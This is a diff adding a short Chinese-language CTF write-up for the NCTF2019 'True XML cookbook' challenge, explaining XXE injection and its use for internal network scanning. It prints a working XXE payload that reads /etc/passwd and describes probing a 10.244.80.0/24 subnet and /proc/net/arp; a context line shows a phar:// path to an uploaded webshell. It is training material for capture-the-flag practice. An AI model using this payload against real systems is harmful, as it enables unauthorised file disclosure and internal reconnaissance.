@@ -7562,7 +7562,31 @@ Burp Suite访问`file=php://filter/resource=phar://uploads/shell.jpg/shell.php`�
 
 ![image-20240420183055814](CTF.assets/image-20240420183055814.png)
 
+## BUUOJ [NCTF2019]True XML cookbook 1
 
+XXE注入，并利用XXE扫描内网，这里的思路跟SSRF是一样的
+
+由于这里的根标签是user，所以DTD定义根最好也用user
+
+```xml
+<!DOCTYPE user [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+<user><username>&xxe;</username><password>
+123</password></user>
+```
+
+![image-20240424211519925](CTF.assets/image-20240424211519925.png)
+
+这里直接读flag是读不到的，需要以`10.244.80.0/24`做一个C段扫描
+
+![image-20240424211629423](CTF.assets/image-20240424211629423.png)
+
+一般的内网扫描流程是使用`http://`逐个访问IP地址，最后访问`/proc/net/arp`查看arp表，但是这里arp表不刷新（我也不知道为什么）
+
+最好在39地址成功访问da
+
+![image-20240424211850922](CTF.assets/image-20240424211850922.png)
 
 # Misc
 
